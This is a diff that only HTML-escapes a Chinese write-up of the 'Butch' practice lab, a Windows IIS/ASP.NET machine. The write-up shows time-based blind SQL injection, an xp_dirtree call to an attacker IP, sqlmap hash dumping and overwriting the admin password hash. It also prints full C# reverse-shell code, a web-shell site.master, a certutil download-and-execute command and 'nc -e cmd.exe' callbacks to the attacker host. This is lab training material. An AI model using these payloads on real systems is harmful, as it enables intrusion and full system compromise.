@@ -5,7 +5,7 @@
 
 这是第26台，Windows系统，难度中等，名称 Butch
 
-> If you know your ASP.NET, you will be fine. Otherwise, this machine will teach you some of that.
+&gt; If you know your ASP.NET, you will be fine. Otherwise, this machine will teach you some of that.
 
 192.168.225.63
 
@@ -67,7 +67,7 @@ PORT     STATE SERVICE       VERSION
 ![image-20240212162925258](resource/26-W-M-Butch.assets/image-20240212162925258.png)
 
 ```sh
-exec master.dbo.xp_dirtree '\\192.168.45.164\123';--
+exec master.dbo.xp_dirtree &#39;\\192.168.45.164\123&#39;;--
 sudo responder -I tun0
 ```
 
@@ -77,71 +77,71 @@ sudo responder -I tun0
 
 ```sql
 # 枚举数据库名
-admin'if(len(db_name()))>=0+waitfor+delay+'0:0:2';--
-admin'if(substring(db_name(),1,1))>='c'+waitfor+delay+'0:0:2';--
+admin&#39;if(len(db_name()))&gt;=0&#43;waitfor&#43;delay&#43;&#39;0:0:2&#39;;--
+admin&#39;if(substring(db_name(),1,1))&gt;=&#39;c&#39;&#43;waitfor&#43;delay&#43;&#39;0:0:2&#39;;--
 # 最终得到数据库名为butch
 
 # 枚举表名
-admin'if((select+count(name)+from+butch..sysobjects+where+xtype='u'))>=0+waitfor+delay+'0:0:2';--  # 有1张表
-admin'if((select+len(name)+from+butch..sysobjects+where+xtype='u'))>=0+waitfor+delay+'0:0:2';--  # 表名长度为5
-admin'if((select+substring(name,1,1)+from+butch..sysobjects+where+xtype='u'))>='u'+waitfor+delay+'0:0:2';--
+admin&#39;if((select&#43;count(name)&#43;from&#43;butch..sysobjects&#43;where&#43;xtype=&#39;u&#39;))&gt;=0&#43;waitfor&#43;delay&#43;&#39;0:0:2&#39;;--  # 有1张表
+admin&#39;if((select&#43;len(name)&#43;from&#43;butch..sysobjects&#43;where&#43;xtype=&#39;u&#39;))&gt;=0&#43;waitfor&#43;delay&#43;&#39;0:0:2&#39;;--  # 表名长度为5
+admin&#39;if((select&#43;substring(name,1,1)&#43;from&#43;butch..sysobjects&#43;where&#43;xtype=&#39;u&#39;))&gt;=&#39;u&#39;&#43;waitfor&#43;delay&#43;&#39;0:0:2&#39;;--
 # 得到表名为 users
 
 # 枚举列名
-admin'if((select+count(name)+from+syscolumns+where+id=OBJECT_ID('users')))>=4+waitfor+delay+'0:0:2';--  # 有3列
-admin'if((select+top+1+len(name)+from+syscolumns+where+id=OBJECT_ID('users')))>=13+waitfor+delay+'0:0:2';-- #第一列列名长度为13
-admin'if((select+top+1+substring(name,1,1)+from+syscolumns+where+id=OBJECT_ID('users')))>='p'+waitfor+delay+'0:0:2';--
+admin&#39;if((select&#43;count(name)&#43;from&#43;syscolumns&#43;where&#43;id=OBJECT_ID(&#39;users&#39;)))&gt;=4&#43;waitfor&#43;delay&#43;&#39;0:0:2&#39;;--  # 有3列
+admin&#39;if((select&#43;top&#43;1&#43;len(name)&#43;from&#43;syscolumns&#43;where&#43;id=OBJECT_ID(&#39;users&#39;)))&gt;=13&#43;waitfor&#43;delay&#43;&#39;0:0:2&#39;;-- #第一列列名长度为13
+admin&#39;if((select&#43;top&#43;1&#43;substring(name,1,1)&#43;from&#43;syscolumns&#43;where&#43;id=OBJECT_ID(&#39;users&#39;)))&gt;=&#39;p&#39;&#43;waitfor&#43;delay&#43;&#39;0:0:2&#39;;--
 # 得到列名为password_hash,user_id,username
 
 # 枚举字段值
-admin'if((select+len(password_hash)+from+butch..users))>=64+waitfor+delay+'0:0:1';--  # password列长度为64
-admin'if((select+substring(password_hash,1,3)+from+butch..users))>='a+waitfor+delay+'0:0:1';--
+admin&#39;if((select&#43;len(password_hash)&#43;from&#43;butch..users))&gt;=64&#43;waitfor&#43;delay&#43;&#39;0:0:1&#39;;--  # password列长度为64
+admin&#39;if((select&#43;substring(password_hash,1,3)&#43;from&#43;butch..users))&gt;=&#39;a&#43;waitfor&#43;delay&#43;&#39;0:0:1&#39;;--
 ```
 
 因为长度太长了，就不手工跑了，用sqlmap跑下最后的结果
 
 ```sh
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Butch]
-└─$ sqlmap -r sqli.txt --level=3 --risk=3 -D butch -T users -C 'password_hash','username' --technique=T --dbms=mssql --dump --batch
+└─$ sqlmap -r sqli.txt --level=3 --risk=3 -D butch -T users -C &#39;password_hash&#39;,&#39;username&#39; --technique=T --dbms=mssql --dump --batch
 ……
 [18:08:47] [WARNING] no clear password(s) found                                                         
 Database: butch
 Table: users
 [1 entry]
-+------------------------------------------------------------------+----------+
+&#43;------------------------------------------------------------------&#43;----------&#43;
 | password_hash                                                    | username |
-+------------------------------------------------------------------+----------+
+&#43;------------------------------------------------------------------&#43;----------&#43;
 | e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267 | butch    |
-+------------------------------------------------------------------+----------+
+&#43;------------------------------------------------------------------&#43;----------&#43;
 ……
 ```
 
 ```sh
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Butch]
 └─$ hashid e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267     
-Analyzing 'e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267'
-[+] Snefru-256 
-[+] SHA-256 
-[+] RIPEMD-256 
-[+] Haval-256 
-[+] GOST R 34.11-94 
-[+] GOST CryptoPro S-Box 
-[+] SHA3-256 
-[+] Skein-256 
-[+] Skein-512(256)
+Analyzing &#39;e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267&#39;
+[&#43;] Snefru-256 
+[&#43;] SHA-256 
+[&#43;] RIPEMD-256 
+[&#43;] Haval-256 
+[&#43;] GOST R 34.11-94 
+[&#43;] GOST CryptoPro S-Box 
+[&#43;] SHA3-256 
+[&#43;] Skein-256 
+[&#43;] Skein-512(256)
 ```
 
 尝试破解Hash失败。
 
-> 做完题后看了官方walkthrough，这里是通过sqlmap破解的密码Hash，不太明白怎么做到的。
->
-> > Since the output contained a password hash, `sqlmap` offers to attempt to crack the hash with a common wordlist. We'll respond with `Y` or `yes` to proceed.
-> >
-> > The attempt is successful, revealing a password of `awesomedude`. We can successfully authenticate to the web app with this password.
->
-> 我本地的结果是没有跑出来的
->
-> ![image-20240212210817069](resource/26-W-M-Butch.assets/image-20240212210817069.png)
+&gt; 做完题后看了官方walkthrough，这里是通过sqlmap破解的密码Hash，不太明白怎么做到的。
+&gt;
+&gt; &gt; Since the output contained a password hash, `sqlmap` offers to attempt to crack the hash with a common wordlist. We&#39;ll respond with `Y` or `yes` to proceed.
+&gt; &gt;
+&gt; &gt; The attempt is successful, revealing a password of `awesomedude`. We can successfully authenticate to the web app with this password.
+&gt;
+&gt; 我本地的结果是没有跑出来的
+&gt;
+&gt; ![image-20240212210817069](resource/26-W-M-Butch.assets/image-20240212210817069.png)
 
 这时候的另一种方法，就是通过SQL注入修改数据库。
 
@@ -149,32 +149,32 @@ Analyzing 'e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267'
 
 ```sh
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Butch]
-└─$ echo '123456' | sha256sum 
+└─$ echo &#39;123456&#39; | sha256sum 
 e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89c1d08aecf422ee401a0  -
 ```
 
 插入新记录失败
 
 ```sql
-insert into users(password_hash,user_id,username) values ('e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89c1d08aecf422ee401a0',2,'test');
+insert into users(password_hash,user_id,username) values (&#39;e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89c1d08aecf422ee401a0&#39;,2,&#39;test&#39;);
 ```
 
 修改原有记录
 
 ```sql
-UPDATE users SET password_hash='e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89c1d08aecf422ee401a0' WHERE username='butch';
+UPDATE users SET password_hash=&#39;e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89c1d08aecf422ee401a0&#39; WHERE username=&#39;butch&#39;;
 ```
 
-还是失败了，错误原因是`echo '123456'`这一步不对，echo默认情况下的输出是带有换行符的，导致计算的结果hash与预期不符。
+还是失败了，错误原因是`echo &#39;123456&#39;`这一步不对，echo默认情况下的输出是带有换行符的，导致计算的结果hash与预期不符。
 
 重新计算Hash，再次修改原有记录：
 
 ```sh
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Butch]
-└─$ echo -n '123456' | sha256sum
+└─$ echo -n &#39;123456&#39; | sha256sum
 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92  -
 
-;UPDATE users SET password_hash='8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92' WHERE username='butch';
+;UPDATE users SET password_hash=&#39;8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92&#39; WHERE username=&#39;butch&#39;;
 ```
 
 ![image-20240212184704451](resource/26-W-M-Butch.assets/image-20240212184704451.png)
@@ -196,32 +196,32 @@ UPDATE users SET password_hash='e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89c1d
 Web服务下有个dev目录，包含了一个site.master.txt文件，疑似是源码的一个备份
 
 ```c#
-<%@ Language="C#" src="site.master.cs" Inherits="MyNamespaceMaster.MyClassMaster" %>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
-	<head runat="server">
-		<title>Butch</title>
-		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-		<meta name="application-name" content="Butch">
-		<meta name="author" content="Butch">
-		<meta name="description" content="Butch">
-		<meta name="keywords" content="Butch">
-		<link media="all" href="style.css" rel="stylesheet" type="text/css" />
-		<link id="favicon" rel="shortcut icon" type="image/png" href="favicon.png" />
-	</head>
-	<body>
-		<div id="wrap">
-			<div id="header">Welcome to Butch Repository</div>
-			<div id="main">
-				<div id="content">
-					<br />
-					<asp:contentplaceholder id="ContentPlaceHolder1" runat="server"></asp:contentplaceholder>
-					<br />
-				</div>
-			</div>
-		</div>
-	</body>
-</html>
+&lt;%@ Language=&#34;C#&#34; src=&#34;site.master.cs&#34; Inherits=&#34;MyNamespaceMaster.MyClassMaster&#34; %&gt;
+&lt;!DOCTYPE html PUBLIC &#34;-//W3C//DTD XHTML 1.0 Strict//EN&#34; &#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&#34;&gt;
+&lt;html xmlns=&#34;http://www.w3.org/1999/xhtml&#34; lang=&#34;en&#34;&gt;
+	&lt;head runat=&#34;server&#34;&gt;
+		&lt;title&gt;Butch&lt;/title&gt;
+		&lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=utf-8&#34; /&gt;
+		&lt;meta name=&#34;application-name&#34; content=&#34;Butch&#34;&gt;
+		&lt;meta name=&#34;author&#34; content=&#34;Butch&#34;&gt;
+		&lt;meta name=&#34;description&#34; content=&#34;Butch&#34;&gt;
+		&lt;meta name=&#34;keywords&#34; content=&#34;Butch&#34;&gt;
+		&lt;link media=&#34;all&#34; href=&#34;style.css&#34; rel=&#34;stylesheet&#34; type=&#34;text/css&#34; /&gt;
+		&lt;link id=&#34;favicon&#34; rel=&#34;shortcut icon&#34; type=&#34;image/png&#34; href=&#34;favicon.png&#34; /&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;div id=&#34;wrap&#34;&gt;
+			&lt;div id=&#34;header&#34;&gt;Welcome to Butch Repository&lt;/div&gt;
+			&lt;div id=&#34;main&#34;&gt;
+				&lt;div id=&#34;content&#34;&gt;
+					&lt;br /&gt;
+					&lt;asp:contentplaceholder id=&#34;ContentPlaceHolder1&#34; runat=&#34;server&#34;&gt;&lt;/asp:contentplaceholder&gt;
+					&lt;br /&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;
+		&lt;/div&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
 ```
 
 微软官方文档[site.master](https://docs.microsoft.com/en-us/previous-versions/wtxbf3hh(v=vs.140)?redirectedfrom=MSDN) 表明该文件为每个页面提供了一个模板在 ASP.NET MVC 风格的应用程序上。
@@ -277,7 +277,7 @@ namespace ConnectBack
 
 		public static void Main(string[] args)
 		{
-			using(TcpClient client = new TcpClient("192.168.45.164", 4444))
+			using(TcpClient client = new TcpClient(&#34;192.168.45.164&#34;, 4444))
 			{
 				using(Stream stream = client.GetStream())
 				{
@@ -288,20 +288,20 @@ namespace ConnectBack
 						StringBuilder strInput = new StringBuilder();
 
 						Process p = new Process();
-						p.StartInfo.FileName = "powershell";
+						p.StartInfo.FileName = &#34;powershell&#34;;
 						p.StartInfo.CreateNoWindow = true;
 						p.StartInfo.UseShellExecute = false;
 						p.StartInfo.RedirectStandardOutput = true;
 						p.StartInfo.RedirectStandardInput = true;
 						p.StartInfo.RedirectStandardError = true;
-						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+						p.OutputDataReceived &#43;= new DataReceivedEventHandler(CmdOutputDataHandler);
 						p.Start();
 						p.BeginOutputReadLine();
 
 						while(true)
 						{
 							strInput.Append(rdr.ReadLine());
-							//strInput.Append("\n");
+							//strInput.Append(&#34;\n&#34;);
 							p.StandardInput.WriteLine(strInput);
 							strInput.Remove(0, strInput.Length);
 						}
@@ -354,7 +354,7 @@ namespace MyNamespaceMaster
     static StreamWriter streamWriter;
 		protected void Page_Load(object sender, EventArgs e)
 		{
-			using(TcpClient client = new TcpClient("192.168.45.164", 445))
+			using(TcpClient client = new TcpClient(&#34;192.168.45.164&#34;, 445))
 			{
 				using(Stream stream = client.GetStream())
 				{
@@ -364,20 +364,20 @@ namespace MyNamespaceMaster
 						StringBuilder strInput = new StringBuilder();
 
 						Process p = new Process();
-						p.StartInfo.FileName = "cmd.exe";
+						p.StartInfo.FileName = &#34;cmd.exe&#34;;
 						p.StartInfo.CreateNoWindow = true;
 						p.StartInfo.UseShellExecute = false;
 						p.StartInfo.RedirectStandardOutput = true;
 						p.StartInfo.RedirectStandardInput = true;
 						p.StartInfo.RedirectStandardError = true;
-						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+						p.OutputDataReceived &#43;= new DataReceivedEventHandler(CmdOutputDataHandler);
 						p.Start();
 						p.BeginOutputReadLine();
 
 						while(true)
 						{
 							strInput.Append(rdr.ReadLine());
-							//strInput.Append("\n");
+							//strInput.Append(&#34;\n&#34;);
 							p.StandardInput.WriteLine(strInput);
 							strInput.Remove(0, strInput.Length);
 						}
@@ -421,7 +421,7 @@ connect to [192.168.45.164] from (UNKNOWN) [192.168.225.63] 49821
 Microsoft Windows [Version 10.0.17763.1217]
 (c) 2018 Microsoft Corporation. All rights reserved.
 whoami
-c:\windows\system32\inetsrv>whoami
+c:\windows\system32\inetsrv&gt;whoami
 nt authority\system
 ```
 
@@ -439,15 +439,15 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 Windows端接收文件：
 
 ```sh
-C:\tmp>copy \\192.168.45.164\share\nc64.exe .
+C:\tmp&gt;copy \\192.168.45.164\share\nc64.exe .
         1 file(s) copied.
 
-C:\tmp>dir
+C:\tmp&gt;dir
  Volume in drive C has no label.
  Volume Serial Number is D4C7-EAE0
  Directory of C:\tmp
-02/12/2024  04:46 AM    <DIR>          .
-02/12/2024  04:46 AM    <DIR>          ..
+02/12/2024  04:46 AM    &lt;DIR&gt;          .
+02/12/2024  04:46 AM    &lt;DIR&gt;          ..
 12/25/2010  09:31 PM            43,696 nc64.exe
                1 File(s)         43,696 bytes
                2 Dir(s)  33,599,651,840 bytes free
@@ -456,7 +456,7 @@ C:\tmp>dir
 再使用nc建立一个稳定的shell
 
 ```sh
-C:\tmp>nc64.exe 192.168.45.164 21 -e cmd.exe
+C:\tmp&gt;nc64.exe 192.168.45.164 21 -e cmd.exe
 ```
 
 
@@ -469,24 +469,24 @@ connect to [192.168.45.164] from (UNKNOWN) [192.168.225.63] 49829
 Microsoft Windows [Version 10.0.17763.1217]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
-C:\tmp>whoami
+C:\tmp&gt;whoami
 whoami
 nt authority\system
 
-C:\tmp>powershell
+C:\tmp&gt;powershell
 powershell
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved.
 
-PS C:\tmp> type C:\users\administrator\desktop\proof.txt
+PS C:\tmp&gt; type C:\users\administrator\desktop\proof.txt
 type C:\users\administrator\desktop\proof.txt
 8efb9ecaa9dd953e25de084f5db30648
-PS C:\tmp> type C:\users\butch\desktop\local.txt
+PS C:\tmp&gt; type C:\users\butch\desktop\local.txt
 type C:\users\butch\desktop\local.txt
 0f5cfaf654fe39337300f602295effb4
-PS C:\tmp> 
+PS C:\tmp&gt; 
 
-PS C:\tmp> 
+PS C:\tmp&gt; 
 ```
 
 #### 恶意文件2
@@ -496,36 +496,36 @@ PS C:\tmp>
 创建一个新的 site.master 文件开始。将包含原始文件中的现有内容并附加任意 C# 代码，该代码输出正在运行 Web 应用程序的用户的名称：
 
 ```c#
-<%@ Language="C#" src="site.master.cs" Inherits="MyNamespaceMaster.MyClassMaster" %>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
-	<head runat="server">
-		<title>Butch</title>
-		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-		<meta name="application-name" content="Butch">
-		<meta name="author" content="Butch">
-		<meta name="description" content="Butch">
-		<meta name="keywords" content="Butch">
-		<link media="all" href="style.css" rel="stylesheet" type="text/css" />
-		<link id="favicon" rel="shortcut icon" type="image/png" href="favicon.png" />
-	</head>
-	<body>
-		<div id="wrap">
-			<div id="header">Welcome to Butch Repository</div>
-			<div id="main">
-				<div id="content">
-					<br />
-					<asp:contentplaceholder id="ContentPlaceHolder1" runat="server"></asp:contentplaceholder>
-					<br />
-				</div>
-			</div>
-		</div>
-	</body>
-</html>
-<%
-string stdout = "";
-string cmd = "whoami";
-System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + cmd);
+&lt;%@ Language=&#34;C#&#34; src=&#34;site.master.cs&#34; Inherits=&#34;MyNamespaceMaster.MyClassMaster&#34; %&gt;
+&lt;!DOCTYPE html PUBLIC &#34;-//W3C//DTD XHTML 1.0 Strict//EN&#34; &#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&#34;&gt;
+&lt;html xmlns=&#34;http://www.w3.org/1999/xhtml&#34; lang=&#34;en&#34;&gt;
+	&lt;head runat=&#34;server&#34;&gt;
+		&lt;title&gt;Butch&lt;/title&gt;
+		&lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=utf-8&#34; /&gt;
+		&lt;meta name=&#34;application-name&#34; content=&#34;Butch&#34;&gt;
+		&lt;meta name=&#34;author&#34; content=&#34;Butch&#34;&gt;
+		&lt;meta name=&#34;description&#34; content=&#34;Butch&#34;&gt;
+		&lt;meta name=&#34;keywords&#34; content=&#34;Butch&#34;&gt;
+		&lt;link media=&#34;all&#34; href=&#34;style.css&#34; rel=&#34;stylesheet&#34; type=&#34;text/css&#34; /&gt;
+		&lt;link id=&#34;favicon&#34; rel=&#34;shortcut icon&#34; type=&#34;image/png&#34; href=&#34;favicon.png&#34; /&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		&lt;div id=&#34;wrap&#34;&gt;
+			&lt;div id=&#34;header&#34;&gt;Welcome to Butch Repository&lt;/div&gt;
+			&lt;div id=&#34;main&#34;&gt;
+				&lt;div id=&#34;content&#34;&gt;
+					&lt;br /&gt;
+					&lt;asp:contentplaceholder id=&#34;ContentPlaceHolder1&#34; runat=&#34;server&#34;&gt;&lt;/asp:contentplaceholder&gt;
+					&lt;br /&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;
+		&lt;/div&gt;
+	&lt;/body&gt;
+&lt;/html&gt;
+&lt;%
+string stdout = &#34;&#34;;
+string cmd = &#34;whoami&#34;;
+System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo(&#34;cmd&#34;, &#34;/c &#34; &#43; cmd);
 procStartInfo.RedirectStandardOutput = true;
 procStartInfo.UseShellExecute = false;
 procStartInfo.CreateNoWindow = true;
@@ -534,7 +534,7 @@ p.StartInfo = procStartInfo;
 p.Start();
 stdout = p.StandardOutput.ReadToEnd();
 Response.Write(stdout);
-%>
+%&gt;
 ```
 
 这么做的好处在于不会让环境崩溃，无需重置环境。
@@ -555,14 +555,14 @@ $ sudo python3 -m http.server 445
 
 
 ```sh
-<%
-string stdout = "";
+&lt;%
+string stdout = &#34;&#34;;
 ArrayList commands = new ArrayList();
-commands.Add("certutil.exe -urlcache -split -f \"http://192.168.49.65:445/shell.exe\" \"C:\\inetpub\\wwwroot\\shell.exe\"");
-commands.Add("\"C:\\inetpub\\wwwroot\\shell.exe\"");
+commands.Add(&#34;certutil.exe -urlcache -split -f \&#34;http://192.168.49.65:445/shell.exe\&#34; \&#34;C:\\inetpub\\wwwroot\\shell.exe\&#34;&#34;);
+commands.Add(&#34;\&#34;C:\\inetpub\\wwwroot\\shell.exe\&#34;&#34;);
 foreach (string cmd in commands) {
 	System.Threading.Thread.Sleep(3000);
-	System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + cmd);
+	System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo(&#34;cmd&#34;, &#34;/c &#34; &#43; cmd);
 	procStartInfo.RedirectStandardOutput = true;
 	procStartInfo.UseShellExecute = false;
 	procStartInfo.CreateNoWindow = true;
@@ -572,7 +572,7 @@ foreach (string cmd in commands) {
 	stdout = p.StandardOutput.ReadToEnd();
 	Response.Write(stdout);
 }
-%>
+%&gt;
 ```
 
 
@@ -587,11 +587,11 @@ connect to [192.168.49.65] from (UNKNOWN) [192.168.65.63] 49687
 Microsoft Windows [Version 10.0.17763.1217]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
-c:\windows\system32\inetsrv>whoami
+c:\windows\system32\inetsrv&gt;whoami
 whoami
 nt authority\system
 
-c:\windows\system32\inetsrv>
+c:\windows\system32\inetsrv&gt;
 ```
 
 
